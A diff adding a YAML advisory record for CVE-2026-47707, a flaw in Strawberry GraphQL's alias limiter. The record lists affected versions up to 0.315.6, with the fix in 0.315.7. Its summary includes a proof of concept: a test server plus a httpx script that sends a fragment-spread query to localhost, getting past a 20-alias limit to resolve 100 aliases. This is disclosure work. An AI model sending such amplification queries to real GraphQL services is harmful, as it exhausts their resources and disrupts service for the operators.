@@ -1,0 +1,504 @@
+advisory_id: GHSA-fr49-mhgj-crfc
+datasource_id: github_osv/GHSA-fr49-mhgj-crfc
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-fr49-mhgj-crfc/GHSA-fr49-mhgj-crfc.json
+aliases:
+  - CVE-2026-47707
+summary: "Strawberry GraphQL's Bypass of MaxAliasesLimiter via Fragment Spreads leading to GraphQL\
+  \ Alias Amplification\n### Summary\nThe MaxAliasesLimiter extension in Strawberry fails to\
+  \ account for the multiplicative/amplification effect of FragmentSpreadNode. While it correctly\
+  \ counts static aliases within the AST it does not consider how many times a fragments internal\
+  \ aliases are expanded during execution. this allows an attacker to bypass alias limits and\
+  \ force the server to resolve and render a significantly higher number of aliases than allowed,\
+  \ potentially leading to a  dos via resource exhaustion.\n\n### Details\nThe current implementation\
+  \ of alias counting in strawberry/extensions/max_aliases.py uses a static approach\n```\n\
+  for selection in selection_set_owner.selection_set.selections: \n    if isinstance(selection,\
+  \ FieldNode) and selection.alias:\n        result += 1\n\n    if isinstance(selection, (FieldNode,\
+  \ InlineFragmentNode)) and ~~~:\n        result += count_fields_with_alias(selection)\n```\n\
+  \nWhen a FragmentSpread is used multiple times, the actual number of aliases processed by\
+  \ the execution engine is\n\n**Total Aliases = query aliases + (num of spreads * aliases within\
+  \ fragment)**\n\nBecause Strawberry only performs a static sum of the text, it misses this\
+  \ multiplication\n\n### PoC\n**server code**\n```\nimport strawberry\nfrom fastapi import\
+  \ FastAPI\nfrom strawberry.fastapi import GraphQLRouter\nfrom strawberry.extensions import\
+  \ MaxAliasesLimiter\n\n@strawberry.type\nclass User:\n    name: str = \"GONA\"\n\n@strawberry.type\n\
+  class Query:\n    @strawberry.field\n    def user(self) -> User:\n        return User()\n\n\
+  # Limit is set to 20 aliases\nschema = strawberry.Schema(\n    query=Query, \n    extensions=[MaxAliasesLimiter(max_alias_count=20)]\n\
+  )\n\napp = FastAPI()\napp.include_router(GraphQLRouter(schema), prefix=\"/graphql\")\n```\n\
+  \n**payloads**\n```\nimport httpx\n\npayload = {\n    \"query\": \"\"\"\n        fragment\
+  \ Amplification on User {\n            a1: name, a2: name, a3: name, a4: name, a5: name,\n\
+  \            a6: name, a7: name, a8: name, a9: name, a10: name\n        }\n        query Bypass\
+  \ {\n            u1: user { ...Amplification }\n            u2: user { ...Amplification }\n\
+  \            u3: user { ...Amplification }\n            u4: user { ...Amplification }\n  \
+  \          u5: user { ...Amplification }\n            u6: user { ...Amplification }\n    \
+  \        u7: user { ...Amplification }\n            u8: user { ...Amplification }\n      \
+  \      u9: user { ...Amplification }\n            u10: user { ...Amplification }\n       \
+  \ }\n    \"\"\"\n}\n\nresponse = httpx.post(\"http://127.0.0.1:8000/graphql\", json=payload)\n\
+  print(f\"Status: {response.status_code}\")\n# The response will contain 100 'a' aliases nested\
+  \ within 10 'u' aliases.\nprint(response.json())\n```\n\n### Impact\nAn attacker can bypass\
+  \ security constraints to cause Application-level DOS. By staying just under the max_alias_count\
+  \ limit in the AST an attacker can trigger thousands of actual alias resolutions on the backend\
+  \ consuming excessive CPU and memory"
+impacted_packages:
+  - purl: pkg:pypi/strawberry-graphql
+    affected_versions: vers:pypi/>=0.172.0|<=0.315.6
+    fixed_versions: vers:pypi/0.315.7
+    affected_packages:
+      - pkg:pypi/strawberry-graphql@0.172.0
+      - pkg:pypi/strawberry-graphql@0.173.0
+      - pkg:pypi/strawberry-graphql@0.173.1
+      - pkg:pypi/strawberry-graphql@0.174.0
+      - pkg:pypi/strawberry-graphql@0.175.0
+      - pkg:pypi/strawberry-graphql@0.175.1
+      - pkg:pypi/strawberry-graphql@0.176.0
+      - pkg:pypi/strawberry-graphql@0.176.1
+      - pkg:pypi/strawberry-graphql@0.176.2
+      - pkg:pypi/strawberry-graphql@0.176.3
+      - pkg:pypi/strawberry-graphql@0.176.4
+      - pkg:pypi/strawberry-graphql@0.177.0
+      - pkg:pypi/strawberry-graphql@0.177.1
+      - pkg:pypi/strawberry-graphql@0.177.2
+      - pkg:pypi/strawberry-graphql@0.177.3
+      - pkg:pypi/strawberry-graphql@0.178.0
+      - pkg:pypi/strawberry-graphql@0.178.1
+      - pkg:pypi/strawberry-graphql@0.178.2
+      - pkg:pypi/strawberry-graphql@0.178.3
+      - pkg:pypi/strawberry-graphql@0.179.0
+      - pkg:pypi/strawberry-graphql@0.180.0
+      - pkg:pypi/strawberry-graphql@0.180.1
+      - pkg:pypi/strawberry-graphql@0.180.2
+      - pkg:pypi/strawberry-graphql@0.180.3
+      - pkg:pypi/strawberry-graphql@0.180.4
+      - pkg:pypi/strawberry-graphql@0.180.5
+      - pkg:pypi/strawberry-graphql@0.181.0
+      - pkg:pypi/strawberry-graphql@0.182.0.dev1686062831
+      - pkg:pypi/strawberry-graphql@0.182.0
+      - pkg:pypi/strawberry-graphql@0.183.0
+      - pkg:pypi/strawberry-graphql@0.183.1.dev1686081894
+      - pkg:pypi/strawberry-graphql@0.183.1
+      - pkg:pypi/strawberry-graphql@0.183.2
+      - pkg:pypi/strawberry-graphql@0.183.3
+      - pkg:pypi/strawberry-graphql@0.183.4
+      - pkg:pypi/strawberry-graphql@0.183.5
+      - pkg:pypi/strawberry-graphql@0.183.6
+      - pkg:pypi/strawberry-graphql@0.183.7
+      - pkg:pypi/strawberry-graphql@0.183.8
+      - pkg:pypi/strawberry-graphql@0.184.0
+      - pkg:pypi/strawberry-graphql@0.184.1
+      - pkg:pypi/strawberry-graphql@0.185.0
+      - pkg:pypi/strawberry-graphql@0.185.1
+      - pkg:pypi/strawberry-graphql@0.185.2.dev1686819062
+      - pkg:pypi/strawberry-graphql@0.185.2
+      - pkg:pypi/strawberry-graphql@0.186.0
+      - pkg:pypi/strawberry-graphql@0.186.1
+      - pkg:pypi/strawberry-graphql@0.186.2
+      - pkg:pypi/strawberry-graphql@0.186.3
+      - pkg:pypi/strawberry-graphql@0.187.0
+      - pkg:pypi/strawberry-graphql@0.187.1
+      - pkg:pypi/strawberry-graphql@0.187.2
+      - pkg:pypi/strawberry-graphql@0.187.3
+      - pkg:pypi/strawberry-graphql@0.187.4
+      - pkg:pypi/strawberry-graphql@0.187.5
+      - pkg:pypi/strawberry-graphql@0.188.0
+      - pkg:pypi/strawberry-graphql@0.189.0
+      - pkg:pypi/strawberry-graphql@0.189.1.dev1687473609
+      - pkg:pypi/strawberry-graphql@0.189.1
+      - pkg:pypi/strawberry-graphql@0.189.2
+      - pkg:pypi/strawberry-graphql@0.189.3
+      - pkg:pypi/strawberry-graphql@0.190.0.dev1687447182
+      - pkg:pypi/strawberry-graphql@0.190.0
+      - pkg:pypi/strawberry-graphql@0.192.0
+      - pkg:pypi/strawberry-graphql@0.192.1
+      - pkg:pypi/strawberry-graphql@0.192.2
+      - pkg:pypi/strawberry-graphql@0.193.0
+      - pkg:pypi/strawberry-graphql@0.193.1
+      - pkg:pypi/strawberry-graphql@0.194.0
+      - pkg:pypi/strawberry-graphql@0.194.1
+      - pkg:pypi/strawberry-graphql@0.194.2
+      - pkg:pypi/strawberry-graphql@0.194.3
+      - pkg:pypi/strawberry-graphql@0.194.4
+      - pkg:pypi/strawberry-graphql@0.195.0
+      - pkg:pypi/strawberry-graphql@0.195.1
+      - pkg:pypi/strawberry-graphql@0.195.2
+      - pkg:pypi/strawberry-graphql@0.195.3
+      - pkg:pypi/strawberry-graphql@0.196.0.dev1689676980
+      - pkg:pypi/strawberry-graphql@0.196.0.dev1689676990
+      - pkg:pypi/strawberry-graphql@0.196.0.dev1690222024
+      - pkg:pypi/strawberry-graphql@0.196.0
+      - pkg:pypi/strawberry-graphql@0.196.1
+      - pkg:pypi/strawberry-graphql@0.196.2
+      - pkg:pypi/strawberry-graphql@0.197.0.dev1690539957
+      - pkg:pypi/strawberry-graphql@0.197.0
+      - pkg:pypi/strawberry-graphql@0.198.0
+      - pkg:pypi/strawberry-graphql@0.199.0
+      - pkg:pypi/strawberry-graphql@0.199.1
+      - pkg:pypi/strawberry-graphql@0.199.2
+      - pkg:pypi/strawberry-graphql@0.199.3
+      - pkg:pypi/strawberry-graphql@0.200.0
+      - pkg:pypi/strawberry-graphql@0.201.0
+      - pkg:pypi/strawberry-graphql@0.201.1
+      - pkg:pypi/strawberry-graphql@0.202.0
+      - pkg:pypi/strawberry-graphql@0.202.1
+      - pkg:pypi/strawberry-graphql@0.203.0
+      - pkg:pypi/strawberry-graphql@0.203.1.dev1691831108
+      - pkg:pypi/strawberry-graphql@0.203.1
+      - pkg:pypi/strawberry-graphql@0.203.2
+      - pkg:pypi/strawberry-graphql@0.203.3
+      - pkg:pypi/strawberry-graphql@0.204.0
+      - pkg:pypi/strawberry-graphql@0.205.0
+      - pkg:pypi/strawberry-graphql@0.206.0
+      - pkg:pypi/strawberry-graphql@0.207.0
+      - pkg:pypi/strawberry-graphql@0.207.1
+      - pkg:pypi/strawberry-graphql@0.208.0
+      - pkg:pypi/strawberry-graphql@0.208.1
+      - pkg:pypi/strawberry-graphql@0.208.2
+      - pkg:pypi/strawberry-graphql@0.208.3
+      - pkg:pypi/strawberry-graphql@0.209.0
+      - pkg:pypi/strawberry-graphql@0.209.1
+      - pkg:pypi/strawberry-graphql@0.209.2
+      - pkg:pypi/strawberry-graphql@0.209.3.dev1696259772
+      - pkg:pypi/strawberry-graphql@0.209.3
+      - pkg:pypi/strawberry-graphql@0.209.4
+      - pkg:pypi/strawberry-graphql@0.209.5
+      - pkg:pypi/strawberry-graphql@0.209.6
+      - pkg:pypi/strawberry-graphql@0.209.7
+      - pkg:pypi/strawberry-graphql@0.209.8.dev1697789637
+      - pkg:pypi/strawberry-graphql@0.209.8
+      - pkg:pypi/strawberry-graphql@0.210.0.dev1697796691
+      - pkg:pypi/strawberry-graphql@0.210.0
+      - pkg:pypi/strawberry-graphql@0.211.0
+      - pkg:pypi/strawberry-graphql@0.211.1
+      - pkg:pypi/strawberry-graphql@0.211.2
+      - pkg:pypi/strawberry-graphql@0.212.0.dev1698770659
+      - pkg:pypi/strawberry-graphql@0.212.0.dev1698790124
+      - pkg:pypi/strawberry-graphql@0.212.0.dev1699050277
+      - pkg:pypi/strawberry-graphql@0.212.0.dev1699288765
+      - pkg:pypi/strawberry-graphql@0.212.0.dev1699291750
+      - pkg:pypi/strawberry-graphql@0.212.0
+      - pkg:pypi/strawberry-graphql@0.213.0.dev1699372734
+      - pkg:pypi/strawberry-graphql@0.213.0.dev1699435418
+      - pkg:pypi/strawberry-graphql@0.213.0.dev1699437859
+      - pkg:pypi/strawberry-graphql@0.213.0
+      - pkg:pypi/strawberry-graphql@0.214.0.dev1699441271
+      - pkg:pypi/strawberry-graphql@0.214.0.dev1701082152
+      - pkg:pypi/strawberry-graphql@0.214.0.dev1701368154
+      - pkg:pypi/strawberry-graphql@0.214.0
+      - pkg:pypi/strawberry-graphql@0.215.0
+      - pkg:pypi/strawberry-graphql@0.215.1
+      - pkg:pypi/strawberry-graphql@0.215.2.dev1701810830
+      - pkg:pypi/strawberry-graphql@0.215.2
+      - pkg:pypi/strawberry-graphql@0.215.3
+      - pkg:pypi/strawberry-graphql@0.216.0
+      - pkg:pypi/strawberry-graphql@0.216.1
+      - pkg:pypi/strawberry-graphql@0.217.0
+      - pkg:pypi/strawberry-graphql@0.217.1
+      - pkg:pypi/strawberry-graphql@0.218.0.dev1705418681
+      - pkg:pypi/strawberry-graphql@0.218.0
+      - pkg:pypi/strawberry-graphql@0.218.1
+      - pkg:pypi/strawberry-graphql@0.219.0
+      - pkg:pypi/strawberry-graphql@0.219.1
+      - pkg:pypi/strawberry-graphql@0.219.2
+      - pkg:pypi/strawberry-graphql@0.220.0.dev1709543239
+      - pkg:pypi/strawberry-graphql@0.220.0
+      - pkg:pypi/strawberry-graphql@0.221.0.dev1710955937
+      - pkg:pypi/strawberry-graphql@0.221.0
+      - pkg:pypi/strawberry-graphql@0.221.1
+      - pkg:pypi/strawberry-graphql@0.222.0
+      - pkg:pypi/strawberry-graphql@0.223.0
+      - pkg:pypi/strawberry-graphql@0.224.0.dev1711748192
+      - pkg:pypi/strawberry-graphql@0.224.0
+      - pkg:pypi/strawberry-graphql@0.224.1
+      - pkg:pypi/strawberry-graphql@0.224.2
+      - pkg:pypi/strawberry-graphql@0.225.0
+      - pkg:pypi/strawberry-graphql@0.225.1
+      - pkg:pypi/strawberry-graphql@0.226.0
+      - pkg:pypi/strawberry-graphql@0.226.1
+      - pkg:pypi/strawberry-graphql@0.226.2
+      - pkg:pypi/strawberry-graphql@0.227.0.dev1713463204
+      - pkg:pypi/strawberry-graphql@0.227.0.dev1713475585
+      - pkg:pypi/strawberry-graphql@0.227.0
+      - pkg:pypi/strawberry-graphql@0.227.1
+      - pkg:pypi/strawberry-graphql@0.227.2
+      - pkg:pypi/strawberry-graphql@0.227.3
+      - pkg:pypi/strawberry-graphql@0.227.4
+      - pkg:pypi/strawberry-graphql@0.227.5
+      - pkg:pypi/strawberry-graphql@0.227.6
+      - pkg:pypi/strawberry-graphql@0.227.7
+      - pkg:pypi/strawberry-graphql@0.228.0.dev1713643365
+      - pkg:pypi/strawberry-graphql@0.228.0
+      - pkg:pypi/strawberry-graphql@0.229.0
+      - pkg:pypi/strawberry-graphql@0.229.1
+      - pkg:pypi/strawberry-graphql@0.229.2.dev1715873118
+      - pkg:pypi/strawberry-graphql@0.229.2.dev1715881453
+      - pkg:pypi/strawberry-graphql@0.229.2
+      - pkg:pypi/strawberry-graphql@0.230.0.dev1716318708
+      - pkg:pypi/strawberry-graphql@0.230.0
+      - pkg:pypi/strawberry-graphql@0.231.0
+      - pkg:pypi/strawberry-graphql@0.231.1
+      - pkg:pypi/strawberry-graphql@0.232.0
+      - pkg:pypi/strawberry-graphql@0.232.1
+      - pkg:pypi/strawberry-graphql@0.232.2
+      - pkg:pypi/strawberry-graphql@0.233.0
+      - pkg:pypi/strawberry-graphql@0.233.1
+      - pkg:pypi/strawberry-graphql@0.233.2
+      - pkg:pypi/strawberry-graphql@0.233.3
+      - pkg:pypi/strawberry-graphql@0.234.0
+      - pkg:pypi/strawberry-graphql@0.234.1
+      - pkg:pypi/strawberry-graphql@0.234.2
+      - pkg:pypi/strawberry-graphql@0.234.3
+      - pkg:pypi/strawberry-graphql@0.235.0
+      - pkg:pypi/strawberry-graphql@0.235.1.dev1719337273
+      - pkg:pypi/strawberry-graphql@0.235.1
+      - pkg:pypi/strawberry-graphql@0.235.2
+      - pkg:pypi/strawberry-graphql@0.236.0
+      - pkg:pypi/strawberry-graphql@0.236.1
+      - pkg:pypi/strawberry-graphql@0.236.2
+      - pkg:pypi/strawberry-graphql@0.237.0
+      - pkg:pypi/strawberry-graphql@0.237.1
+      - pkg:pypi/strawberry-graphql@0.237.2
+      - pkg:pypi/strawberry-graphql@0.237.3
+      - pkg:pypi/strawberry-graphql@0.238.0
+      - pkg:pypi/strawberry-graphql@0.238.1
+      - pkg:pypi/strawberry-graphql@0.239.0
+      - pkg:pypi/strawberry-graphql@0.239.1
+      - pkg:pypi/strawberry-graphql@0.239.2
+      - pkg:pypi/strawberry-graphql@0.240.0
+      - pkg:pypi/strawberry-graphql@0.240.1
+      - pkg:pypi/strawberry-graphql@0.240.2
+      - pkg:pypi/strawberry-graphql@0.240.3.dev1726159932
+      - pkg:pypi/strawberry-graphql@0.240.3
+      - pkg:pypi/strawberry-graphql@0.240.4
+      - pkg:pypi/strawberry-graphql@0.241.0
+      - pkg:pypi/strawberry-graphql@0.242.0
+      - pkg:pypi/strawberry-graphql@0.243.0
+      - pkg:pypi/strawberry-graphql@0.243.1
+      - pkg:pypi/strawberry-graphql@0.244.0
+      - pkg:pypi/strawberry-graphql@0.244.1
+      - pkg:pypi/strawberry-graphql@0.245.0
+      - pkg:pypi/strawberry-graphql@0.246.0
+      - pkg:pypi/strawberry-graphql@0.246.1
+      - pkg:pypi/strawberry-graphql@0.246.2
+      - pkg:pypi/strawberry-graphql@0.246.3
+      - pkg:pypi/strawberry-graphql@0.247.0
+      - pkg:pypi/strawberry-graphql@0.247.1
+      - pkg:pypi/strawberry-graphql@0.247.2
+      - pkg:pypi/strawberry-graphql@0.248.0
+      - pkg:pypi/strawberry-graphql@0.248.1
+      - pkg:pypi/strawberry-graphql@0.249.0
+      - pkg:pypi/strawberry-graphql@0.250.0
+      - pkg:pypi/strawberry-graphql@0.250.1
+      - pkg:pypi/strawberry-graphql@0.251.0
+      - pkg:pypi/strawberry-graphql@0.252.0
+      - pkg:pypi/strawberry-graphql@0.253.0
+      - pkg:pypi/strawberry-graphql@0.253.1
+      - pkg:pypi/strawberry-graphql@0.254.0
+      - pkg:pypi/strawberry-graphql@0.254.1
+      - pkg:pypi/strawberry-graphql@0.255.0
+      - pkg:pypi/strawberry-graphql@0.256.0
+      - pkg:pypi/strawberry-graphql@0.256.1
+      - pkg:pypi/strawberry-graphql@0.257.0.dev1735244504
+      - pkg:pypi/strawberry-graphql@0.257.0
+      - pkg:pypi/strawberry-graphql@0.258.0
+      - pkg:pypi/strawberry-graphql@0.258.1
+      - pkg:pypi/strawberry-graphql@0.259.0
+      - pkg:pypi/strawberry-graphql@0.259.1
+      - pkg:pypi/strawberry-graphql@0.260.0
+      - pkg:pypi/strawberry-graphql@0.260.1
+      - pkg:pypi/strawberry-graphql@0.260.2
+      - pkg:pypi/strawberry-graphql@0.260.3
+      - pkg:pypi/strawberry-graphql@0.260.4
+      - pkg:pypi/strawberry-graphql@0.261.0
+      - pkg:pypi/strawberry-graphql@0.261.1
+      - pkg:pypi/strawberry-graphql@0.262.0
+      - pkg:pypi/strawberry-graphql@0.262.1
+      - pkg:pypi/strawberry-graphql@0.262.2
+      - pkg:pypi/strawberry-graphql@0.262.3
+      - pkg:pypi/strawberry-graphql@0.262.4
+      - pkg:pypi/strawberry-graphql@0.262.5
+      - pkg:pypi/strawberry-graphql@0.262.6
+      - pkg:pypi/strawberry-graphql@0.262.7.dev1743345593
+      - pkg:pypi/strawberry-graphql@0.263.0.dev1743450281
+      - pkg:pypi/strawberry-graphql@0.263.0.dev1743450503
+      - pkg:pypi/strawberry-graphql@0.263.0.dev1743450741
+      - pkg:pypi/strawberry-graphql@0.263.0.dev1743582446
+      - pkg:pypi/strawberry-graphql@0.263.0
+      - pkg:pypi/strawberry-graphql@0.263.1
+      - pkg:pypi/strawberry-graphql@0.263.2
+      - pkg:pypi/strawberry-graphql@0.264.0
+      - pkg:pypi/strawberry-graphql@0.264.1
+      - pkg:pypi/strawberry-graphql@0.265.0
+      - pkg:pypi/strawberry-graphql@0.265.1
+      - pkg:pypi/strawberry-graphql@0.266.0.dev1744797470
+      - pkg:pypi/strawberry-graphql@0.266.0
+      - pkg:pypi/strawberry-graphql@0.266.1
+      - pkg:pypi/strawberry-graphql@0.267.0.dev1746643548
+      - pkg:pypi/strawberry-graphql@0.267.0
+      - pkg:pypi/strawberry-graphql@0.268.0
+      - pkg:pypi/strawberry-graphql@0.268.1
+      - pkg:pypi/strawberry-graphql@0.268.2.dev1747436835
+      - pkg:pypi/strawberry-graphql@0.268.2
+      - pkg:pypi/strawberry-graphql@0.269.0.dev1746905409
+      - pkg:pypi/strawberry-graphql@0.269.0.dev1747164009
+      - pkg:pypi/strawberry-graphql@0.269.0
+      - pkg:pypi/strawberry-graphql@0.270.0
+      - pkg:pypi/strawberry-graphql@0.270.1
+      - pkg:pypi/strawberry-graphql@0.270.2
+      - pkg:pypi/strawberry-graphql@0.270.3
+      - pkg:pypi/strawberry-graphql@0.270.4
+      - pkg:pypi/strawberry-graphql@0.270.5
+      - pkg:pypi/strawberry-graphql@0.270.6
+      - pkg:pypi/strawberry-graphql@0.271.0
+      - pkg:pypi/strawberry-graphql@0.271.1
+      - pkg:pypi/strawberry-graphql@0.271.2
+      - pkg:pypi/strawberry-graphql@0.272.0
+      - pkg:pypi/strawberry-graphql@0.272.1
+      - pkg:pypi/strawberry-graphql@0.273.0
+      - pkg:pypi/strawberry-graphql@0.273.1
+      - pkg:pypi/strawberry-graphql@0.273.2
+      - pkg:pypi/strawberry-graphql@0.273.3
+      - pkg:pypi/strawberry-graphql@0.274.0
+      - pkg:pypi/strawberry-graphql@0.274.1
+      - pkg:pypi/strawberry-graphql@0.274.2
+      - pkg:pypi/strawberry-graphql@0.274.3
+      - pkg:pypi/strawberry-graphql@0.275.0
+      - pkg:pypi/strawberry-graphql@0.275.1
+      - pkg:pypi/strawberry-graphql@0.275.2
+      - pkg:pypi/strawberry-graphql@0.275.3
+      - pkg:pypi/strawberry-graphql@0.275.4
+      - pkg:pypi/strawberry-graphql@0.275.5
+      - pkg:pypi/strawberry-graphql@0.275.6
+      - pkg:pypi/strawberry-graphql@0.275.7
+      - pkg:pypi/strawberry-graphql@0.276.0.dev1750672223
+      - pkg:pypi/strawberry-graphql@0.276.0.dev1752831589
+      - pkg:pypi/strawberry-graphql@0.276.0
+      - pkg:pypi/strawberry-graphql@0.276.1
+      - pkg:pypi/strawberry-graphql@0.276.2
+      - pkg:pypi/strawberry-graphql@0.277.0
+      - pkg:pypi/strawberry-graphql@0.277.1
+      - pkg:pypi/strawberry-graphql@0.278.0
+      - pkg:pypi/strawberry-graphql@0.278.1
+      - pkg:pypi/strawberry-graphql@0.279.0.dev1754138688
+      - pkg:pypi/strawberry-graphql@0.279.0.dev1754156227
+      - pkg:pypi/strawberry-graphql@0.279.0.dev1754159379
+      - pkg:pypi/strawberry-graphql@0.279.0
+      - pkg:pypi/strawberry-graphql@0.280.0
+      - pkg:pypi/strawberry-graphql@0.281.0
+      - pkg:pypi/strawberry-graphql@0.282.0
+      - pkg:pypi/strawberry-graphql@0.283.0
+      - pkg:pypi/strawberry-graphql@0.283.1
+      - pkg:pypi/strawberry-graphql@0.283.2
+      - pkg:pypi/strawberry-graphql@0.283.3
+      - pkg:pypi/strawberry-graphql@0.284.0
+      - pkg:pypi/strawberry-graphql@0.284.1
+      - pkg:pypi/strawberry-graphql@0.284.2
+      - pkg:pypi/strawberry-graphql@0.284.3
+      - pkg:pypi/strawberry-graphql@0.284.4
+      - pkg:pypi/strawberry-graphql@0.285.0.dev1762469343
+      - pkg:pypi/strawberry-graphql@0.285.0
+      - pkg:pypi/strawberry-graphql@0.286.0
+      - pkg:pypi/strawberry-graphql@0.286.1
+      - pkg:pypi/strawberry-graphql@0.287.0
+      - pkg:pypi/strawberry-graphql@0.287.1
+      - pkg:pypi/strawberry-graphql@0.287.2
+      - pkg:pypi/strawberry-graphql@0.287.3
+      - pkg:pypi/strawberry-graphql@0.287.4
+      - pkg:pypi/strawberry-graphql@0.288.0
+      - pkg:pypi/strawberry-graphql@0.288.1
+      - pkg:pypi/strawberry-graphql@0.288.2
+      - pkg:pypi/strawberry-graphql@0.288.3
+      - pkg:pypi/strawberry-graphql@0.288.4
+      - pkg:pypi/strawberry-graphql@0.289.0
+      - pkg:pypi/strawberry-graphql@0.289.1
+      - pkg:pypi/strawberry-graphql@0.289.2
+      - pkg:pypi/strawberry-graphql@0.289.3
+      - pkg:pypi/strawberry-graphql@0.289.4
+      - pkg:pypi/strawberry-graphql@0.289.5
+      - pkg:pypi/strawberry-graphql@0.289.6
+      - pkg:pypi/strawberry-graphql@0.289.7
+      - pkg:pypi/strawberry-graphql@0.289.8
+      - pkg:pypi/strawberry-graphql@0.290.0
+      - pkg:pypi/strawberry-graphql@0.291.0
+      - pkg:pypi/strawberry-graphql@0.291.1
+      - pkg:pypi/strawberry-graphql@0.291.2.dev1770456508
+      - pkg:pypi/strawberry-graphql@0.291.2.dev1771437961
+      - pkg:pypi/strawberry-graphql@0.291.2
+      - pkg:pypi/strawberry-graphql@0.291.3
+      - pkg:pypi/strawberry-graphql@0.292.0
+      - pkg:pypi/strawberry-graphql@0.293.0
+      - pkg:pypi/strawberry-graphql@0.294.0
+      - pkg:pypi/strawberry-graphql@0.295.0
+      - pkg:pypi/strawberry-graphql@0.296.0
+      - pkg:pypi/strawberry-graphql@0.296.1
+      - pkg:pypi/strawberry-graphql@0.296.2
+      - pkg:pypi/strawberry-graphql@0.297.0
+      - pkg:pypi/strawberry-graphql@0.298.0
+      - pkg:pypi/strawberry-graphql@0.298.1
+      - pkg:pypi/strawberry-graphql@0.299.0
+      - pkg:pypi/strawberry-graphql@0.300.0
+      - pkg:pypi/strawberry-graphql@0.301.0
+      - pkg:pypi/strawberry-graphql@0.302.0
+      - pkg:pypi/strawberry-graphql@0.303.0
+      - pkg:pypi/strawberry-graphql@0.303.1
+      - pkg:pypi/strawberry-graphql@0.304.0
+      - pkg:pypi/strawberry-graphql@0.305.0
+      - pkg:pypi/strawberry-graphql@0.306.0
+      - pkg:pypi/strawberry-graphql@0.307.0
+      - pkg:pypi/strawberry-graphql@0.307.1
+      - pkg:pypi/strawberry-graphql@0.308.0
+      - pkg:pypi/strawberry-graphql@0.308.1
+      - pkg:pypi/strawberry-graphql@0.308.2
+      - pkg:pypi/strawberry-graphql@0.308.3
+      - pkg:pypi/strawberry-graphql@0.309.0
+      - pkg:pypi/strawberry-graphql@0.310.0
+      - pkg:pypi/strawberry-graphql@0.310.1
+      - pkg:pypi/strawberry-graphql@0.310.2
+      - pkg:pypi/strawberry-graphql@0.311.0
+      - pkg:pypi/strawberry-graphql@0.311.1
+      - pkg:pypi/strawberry-graphql@0.311.2
+      - pkg:pypi/strawberry-graphql@0.311.3
+      - pkg:pypi/strawberry-graphql@0.312.0
+      - pkg:pypi/strawberry-graphql@0.312.1
+      - pkg:pypi/strawberry-graphql@0.312.2
+      - pkg:pypi/strawberry-graphql@0.312.3
+      - pkg:pypi/strawberry-graphql@0.312.4
+      - pkg:pypi/strawberry-graphql@0.313.0
+      - pkg:pypi/strawberry-graphql@0.314.0
+      - pkg:pypi/strawberry-graphql@0.314.1
+      - pkg:pypi/strawberry-graphql@0.314.2
+      - pkg:pypi/strawberry-graphql@0.314.3
+      - pkg:pypi/strawberry-graphql@0.315.0
+      - pkg:pypi/strawberry-graphql@0.315.1
+      - pkg:pypi/strawberry-graphql@0.315.2
+      - pkg:pypi/strawberry-graphql@0.315.3
+      - pkg:pypi/strawberry-graphql@0.315.4
+      - pkg:pypi/strawberry-graphql@0.315.5
+      - pkg:pypi/strawberry-graphql@0.315.6
+    fixed_packages:
+      - pkg:pypi/strawberry-graphql@0.315.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-fr49-mhgj-crfc/GHSA-fr49-mhgj-crfc.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-400
+references:
+  - url: https://github.com/strawberry-graphql/strawberry
+    reference_type:
+    reference_id:
+  - url: https://github.com/strawberry-graphql/strawberry/releases/tag/0.315.7
+    reference_type:
+    reference_id:
+  - url: https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-fr49-mhgj-crfc
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-47707
+    reference_type:
+    reference_id:
+exploits: []
